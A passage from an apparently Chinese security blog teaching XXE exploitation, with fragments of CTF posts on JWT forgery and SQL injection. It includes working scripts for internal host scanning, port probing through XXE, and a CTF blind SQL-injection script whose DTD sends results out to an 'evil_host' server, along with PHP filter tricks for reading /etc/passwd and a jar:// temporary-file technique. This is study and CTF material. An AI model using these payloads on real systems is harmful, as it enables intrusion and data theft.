<h4 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a>新的思考：</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
<h4 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a>新的利用：</h4><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p>
<p><strong>如图所示:</strong></p>
<p><img src="https://i.imgur.com/QsNmhnD.png" alt=""></p>
<p>PHP在安装扩展以后还能支持的协议：</p>
<p><strong>如图所示：</strong></p>
<p><img src="https://i.imgur.com/yagSMz8.png" alt=""></p>
<p><strong>注意：</strong></p>
<p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p>
<h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a>实验三：HTTP 内网主机探测</h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
<p><strong>下面是一个探测脚本的实例：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span><span class="params">(string)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!ENTITY xxe SYSTEM """</span> + <span class="string">'"'</span> + string + <span class="string">'"'</span> + <span class="string">"""&gt;]&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;xml&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;/xml&gt;"""</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span><span class="params">(xml)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">'http://34.200.157.128/CUSTOM/NEW_XEE.php'</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">' '</span>)[<span class="number">-2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="keyword">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">'10.0.0.'</span> + i</span><br><span class="line">        string = <span class="string">'php://filter/convert.base64-encode/resource=http://'</span> + ip + <span class="string">'/'</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>

<p><strong>返回结果：</strong></p>
<p><img src="https://i.imgur.com/iqZlZdf.png" alt=""></p>
<h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a>实验四：HTTP 内网主机端口扫描</h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p>
<p><strong>比如我们传入：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:515/"</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">data</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>返回结果：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An <span class="builtin-name">error</span> occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████:<span class="built_in"> Connection </span>refused</span><br></pre></td></tr></table></figure></div>

<p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p>
<p><strong>如下图所示：</strong></p>
<p><img src="https://i.imgur.com/HpfpmxB.png" alt=""></p>
<p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p>
<h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p>
<p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p>
<p><strong>如图所示：</strong></p>
<p><img src="https://i.imgur.com/PZigmLG.png" alt=""></p>
<p><img src="https://i.imgur.com/nOLt3zk.png" alt=""></p>
<p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/52dandan.cc/</span>public_html<span class="regexp">/config.php</span></span><br></pre></td></tr></table></figure></div>

<p>拿到第一部分 flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PUPPET"><figure class="iseeu highlight /puppet"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">define</span>(<span class="section">BASEDIR</span>, <span class="string">"/var/www/52dandan.club/"</span>);</span><br><span class="line"><span class="keyword">define</span>(<span class="section">FLAG_SIG</span>, 1);</span><br><span class="line"><span class="keyword">define</span>(<span class="section">SECRETFILE</span>,<span class="string">'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431'</span>);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>注意：</strong></p>
<p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p>
<p>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p>
<p>然后我们考虑内网有没有东西，我们读取</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"><span class="meta-keyword">/etc/</span>host</span><br></pre></td></tr></table></figure></div>

<p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p>
<p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = 'http://39.107.33.75:33899/common.php'</span><br><span class="line">s = requests.Session()</span><br><span class="line">result = ''</span><br><span class="line">data = &#123;</span><br><span class="line">        "name":"evil_man",</span><br><span class="line">        "email":"testabcdefg@gmail.com",</span><br><span class="line">        "comment":"""<span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line">                <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta">                <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://evil_host/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">                %dtd;]&gt;</span></span><br><span class="line">                """</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f = open('./evil.dtd','w')</span><br><span class="line">            payload2 = """<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"</span>&gt;</span></span><br><span class="line">                <span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'&gt;"</span>&gt;</span></span><br><span class="line">                %all;</span><br><span class="line">                %send;""".format('_'*i+chr(j)+'_'*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print 'test &#123;&#125;'.format(chr(j))</span><br><span class="line">                r = s.post(url,data=data)</span><br><span class="line">                if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':</span><br><span class="line">                        result += chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></div>

<p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p>
<h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p>
<p><strong>jar:// 协议的格式：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">jar:</span><span class="template-variable">&#123;url&#125;</span><span class="xml">!</span><span class="template-variable">&#123;path&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>实例：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">jar:</span><span class="string">http:</span><span class="comment">//host/application.jar!/file/within/the/zip</span></span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure></div>

<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p>
<p><strong>jar 协议处理文件的过程：</strong></p>
<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
<blockquote>
<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
<p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
</blockquote>
<p>下面是我的一些测试过程：</p>
<p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p>
<p><strong>示例代码：</strong></p>
<p><strong>xml_test.java</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">package xml_test;</span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.DocumentBuilder;</span><br><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line">import org.w3c.dom.Attr;</span><br><span class="line">import org.w3c.dom.Comment;</span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.Element;</span><br><span class="line">import org.w3c.dom.NamedNodeMap;</span><br><span class="line">import org.w3c.dom.Node;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上</span></span><br><span class="line"><span class="comment"> * @author zhanglong</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="keyword">class</span> xml_test</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        DocumentBuilderFactory dbf = <span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">        DocumentBuilder db = dbf.<span class="keyword">new</span><span class="constructor">DocumentBuilder()</span>;</span><br><span class="line"></span><br><span class="line">        Document doc = db.parse(<span class="keyword">new</span> <span class="constructor">File(<span class="string">"student.xml"</span>)</span>);</span><br><span class="line">        <span class="comment">//获得根元素结点</span></span><br><span class="line">        Element root = doc.get<span class="constructor">DocumentElement()</span>;</span><br><span class="line"></span><br><span class="line">        parse<span class="constructor">Element(<span class="params">root</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> static void parse<span class="constructor">Element(Element <span class="params">element</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        String tagName = element.get<span class="constructor">NodeName()</span>;</span><br><span class="line"></span><br><span class="line">        NodeList children = element.get<span class="constructor">ChildNodes()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&lt;"</span> + tagName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断</span></span><br><span class="line">        NamedNodeMap map = element.get<span class="constructor">Attributes()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果该元素存在属性</span></span><br><span class="line">        <span class="keyword">if</span>(null != map)</span><br><span class="line">        &#123;</span><br><span class="line">            for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; map.get<span class="constructor">Length()</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//获得该元素的每一个属性</span></span><br><span class="line">                Attr attr = (Attr)map.item(i);</span><br><span class="line"></span><br><span class="line">                String attrName = attr.get<span class="constructor">Name()</span>;</span><br><span class="line">                String attrValue = attr.get<span class="constructor">Value()</span>;</span><br><span class="line"></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">" "</span> + attrName + <span class="string">"=\""</span> + attrValue + <span class="string">"\""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; children.get<span class="constructor">Length()</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node node = children.item(i);</span><br><span class="line">            <span class="comment">//获得结点的类型</span></span><br><span class="line">            short nodeType = node.get<span class="constructor">NodeType()</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(nodeType<span class="operator"> == </span>Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//是元素，继续递归</span></span><br><span class="line">                parse<span class="constructor">Element((Element)</span>node);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType<span class="operator"> == </span>Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//递归出口</span></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(node.get<span class="constructor">NodeValue()</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType<span class="operator"> == </span>Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&lt;!--"</span>);</span><br><span class="line"></span><br><span class="line">                Comment comment = (Comment)node;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//注释内容</span></span><br><span class="line">                String data = comment.get<span class="constructor">Data()</span>;</span><br><span class="line"></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(data);</span><br><span class="line"></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"--&gt;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&lt;/"</span> + tagName + <span class="string">"&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p>
<p><strong>student.xml</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"jar:http://localhost:9999/jar.zip!/wm.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">convert</span>&gt;</span><span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">convert</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>目录结构如下图：</strong></p>
<p><img src="https://i.imgur.com/SFBWxXl.png" alt=""></p>
<p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p>
<p><strong>示例代码：</strong></p>
<p><strong>sever.py</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'localhost'</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'Client req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"get error at:"</span>+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'waiting for connection...'</span>) </span><br><span class="line">    server_thread = threading.Thread(target=jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon = <span class="literal">True</span> </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure></div>

<p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p>
<p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p>
<blockquote>
<p><strong>jar 协议处理文件的过程：</strong></p>
<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
</blockquote>
<p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">jar:</span><span class="string">http:</span><span class="comment">//localhost:9999/jar.zip!/1.php</span></span><br></pre></td></tr></table></figure></div>

<p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p>
<p><strong>如下图：</strong></p>
<p><img src="https://i.imgur.com/u3U1EPq.png" alt=""></p>
<p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p>
<p><strong>下面是我的实验录屏：</strong></p>
<img src="https://i.imgur.com/8WMGQfV.gif">

<p>实验就到这一步了，怎么利用就看各位大佬的了.</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>几个实验都是Korz3n大佬那拿来的</p>
<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
<p><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/6681114.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/6681114.html</a></p>
<p><a href="https://m3lon.github.io/2019/01/20/xxe实验踩坑记录/" target="_blank" rel="noopener">https://m3lon.github.io/2019/01/20/xxe%E5%AE%9E%E9%AA%8C%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</a></p>
<p><a href="https://www.jianshu.com/p/77f2181587a4" target="_blank" rel="noopener">https://www.jianshu.com/p/77f2181587a4</a></p>
]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>RCE漏洞</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC | 未知的风险-1</title>
    <url>/undefined/%5BISCC%5D%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/</url>
    <content><![CDATA[<p><img src="https://i.imgur.com/p3MffHP.png" alt=""></p>
<p>进入题目：   </p>
<p><img src="https://i.imgur.com/BCfxRDa.png" alt=""></p>
<p>题目提示user才能进去，抓包得到token       </p>
<p><img src="https://i.imgur.com/nJHyhmu.png" alt="">     </p>
<p>然后暴力破解token得到密钥进行伪造token            </p>
<p>攻击JWT的一些方法：       </p>
<p><a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>
]]></content>
      <categories>
        <category>WEB安全漏洞</category>
        <category>XXE漏洞</category>
      </categories>
      <tags>
        <tag>JWT | XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku | insert into</title>
    <url>/undefined/%5Bbugku%5Dinsert%20into/</url>
    <content><![CDATA[<p>这道题我觉得还是主要考了编写脚本的能力  </p>
<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>flag格式：flag{xxxxxxxxxxxx}   </p>
<p>不如写个Python吧    </p>
